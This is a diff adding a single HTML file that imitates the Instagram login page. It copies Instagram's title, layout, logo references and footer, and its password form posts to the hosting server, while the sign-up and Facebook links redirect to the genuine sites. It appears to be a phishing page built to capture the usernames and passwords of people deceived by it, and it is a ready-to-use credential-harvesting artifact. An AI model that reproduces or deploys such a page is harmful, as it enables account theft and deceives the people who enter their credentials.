@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login &bull; Instagram</title>
+     <!-- add icon link -->
+     <link rel="icon" href="instaico.ico" type = "image/x-icon">
+    <style>
+        #mainbox {
+            width: 348px;
+            height: 358px;
+            padding: 10px 0;
+            margin: 0 0 10px;
+            border: 1px solid rgba(var(--b6a,219,219,219),1);
+            background-color: white;
+            position: absolute;
+            top: 30%;
+            left: 49.5%;
+            transform: translate(-50%, -50%);
+        }
+        #seccon {
+            width: 348px;
+            height: 53px;
+            font-family: Arial, Helvetica, sans-serif;
+            border: 1px solid rgba(var(--b6a,219,219,219),1);
+            background-color: white;
+            position: absolute;
+            padding-top: 7px;
+            top: 59%;
+            left: 49.5%;
+            font-size: 14px;
+            transform: translate(-50%, -50%);
+        }
+        #third {
+            position: absolute;
+            top: 69%;
+            left: 49.5%;
+            transform: translate(-50%, -50%);
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 14px;
+        }
+        #mainbox img {
+            pointer-events: none;
+            margin-top: 17px;
+            margin-left: -5px;
+            user-select: none;
+            z-index: -1;
+        }
+        .inputelements input[type=text], .inputelements input[type=password]{
+            margin-top: 14.5px;
+            width: 74%;
+            padding-left: 7px;
+            padding-top: 3px;
+            padding-bottom: 3px;
+            height: 28.5px;
+            border-radius: 3px;
+            font-size: 12px;
+            border: 1px solid rgba(var(--ca6,219,219,219),1);
+            background-color: #FAFAFA;
+        }
+        .inputelements input[name=password]{
+            margin-top: 6.3px;
+        }
+        .inputelements button[type=submit]{
+            background-color: #0095f6;
+            width: 77%;
+            height: 29px;
+            margin-top: -3px;
+            border-width: 0;
+            padding-left: 5px;
+            padding-top: 7px;
+            padding-bottom: 20px;
+            font-size: 14px;
+            border-radius: 4px;
+            color: white;
+            font-weight: bold;
+            opacity: .3;
+        }
+        .linetext {
+            display: flex;
+            margin-top: 0;
+            color: gray;
+            font-size: 14px;
+        }
+        #fb {
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 14px;
+            margin-top: -5px;
+        }
+        footer {
+            position: absolute;
+            bottom: 5%;
+        }
+        #elem nav ul {
+            list-style: none;
+            display: flex;
+            font-size: 13px;
+            color: #00376b;
+            font-weight: bold;
+            margin-left: 14%;   
+        }
+        #elem nav ul li {
+            padding-left: 15px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+    </style>
+</head>
+<body>
+        <div class="container" id="mainbox">
+            <center><img src="insta.png" alt="instagram logo"></center>
+            <br>
+            <div class="inputelements">
+                <form method="POST" id="ancestor">
+                    <center><input type="text" name="username" placeholder="Phone number, username, or email"></center>
+                    <center><input type="password" name="password" placeholder="Password"></center>
+                    <br>
+                    <center><button type="submit" name="sub" id="mybtn">Log In</center>
+                </form>
+                <br>
+                <div class="linetext">
+                    <hr style="width:28%;height:1px;border:0.1px solid rgba(var(--b6a,219,219,219),1);margin-right:35px;">
+                    <span><b>OR</b></span>
+                    <hr style="width:28%;height:1px;border:0.1px solid rgba(var(--b6a,219,219,219),1);margin-left:35px;">
+                </div>
+                
+                <div id="fb">
+                    <center>
+                        <p><img src="fbico.ico" height="16px" width="16px" id="fbimg" alt="facebook-img">&ensp;
+                        <span id="fblink" style="color:#385185;cursor: pointer;"><b>Log in with Facebook</b></span></p>
+                        <br>
+                        <p style="margin-top:-10px;cursor:pointer;color:#385185;font-size: 12px;font-weight: 120;">Forgot Password ?</p>
+                </center>
+                </div>
+                
+            </div>
+             
+        </div>
+
+        <div class="con2" id="seccon">
+            <center><p>Don't have an account? <span id="signup" style="color:#0095f6;cursor: pointer;"><b>Sign up</b></span></p></center>
+        </div>
+
+
+        <div id="third">
+            <center><p>Get the app.</p></center>
+            <br>
+            <div class="images" style="display: flex; margin-top:-10px;">
+                <img src="apple.png" height="40px" width="136px" style="cursor: pointer;">&ensp;
+                <img src="googleplay.png"  height="40px" width="136px" style="cursor: pointer;">
+            </div>
+        </div>
+        
+    <footer>
+        <div class="footer-nav">
+            <div class="elements" id="elem">
+                <nav>
+                    <ul>
+                    <li>ABOUT</li>
+                    <li>HELP</li>
+                    <li>PRESS</li>
+                    <li>API</li>
+                    <li>JOBS</li>
+                    <li>PRIVACY</li>
+                    <li>TERMS</li>
+                    <li>LOCATIONS</li>
+                    <li>TOP&nbsp;ACCOUNTS</li>
+                    <li>HASHTAGS</li>
+                    <li>LANGUAGE</li>
+                    <li>&ensp;</li>
+                    <li>&ensp;</li>
+                    <li>&ensp;&ensp;</li>
+                    <li>&ensp;</li>
+                    <li>&ensp;</li>
+                    <li>&ensp;&ensp;</li>
+                    <li style="color:#8E8E8E;">©&nbsp;2020&nbsp;INSTAGRAM&nbsp;FROM&nbsp;FACEBOOK</li>
+                </ul>
+                </nav>
+            </div>
+        </div>
+    </footer>
+
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+    $(document).ready(function(){
+      $("#signup").click(function(){
+        window.location.replace("https://www.instagram.com/accounts/emailsignup/?hl=en");
+      });
+      $("#fbimg, #fblink").click(function(){
+        window.location.replace("https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%2522mnwhk94ciwoqw6damjanmfkj120s0hfjah44k16l8m8k1wq5bur%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0ea07cba-8919-4328-bf53-054d7b684452&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522mnwhk94ciwoqw6damjanmfkj120s0hfjah44k16l8m8k1wq5bur%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0");
+      });
+
+      $('#ancestor input').on('keyup',function(){
+        
+        var foo = $('input[name=username]').val();
+        var bar = $('input[name=password]').val(); 
+        
+        if(foo.length >= 4 && bar.length >= 4)
+        {
+            $("#BtnNext").prop("disabled", true);
+            $("#mybtn").css("opacity","1");
+        }
+        else {
+            $("#BtnNext").prop("enabled", true);
+            $("#mybtn").css("opacity","0.3");
+        }
+            
+      });
+
+      
+
+    });
+    </script>
+</body>
+</html>
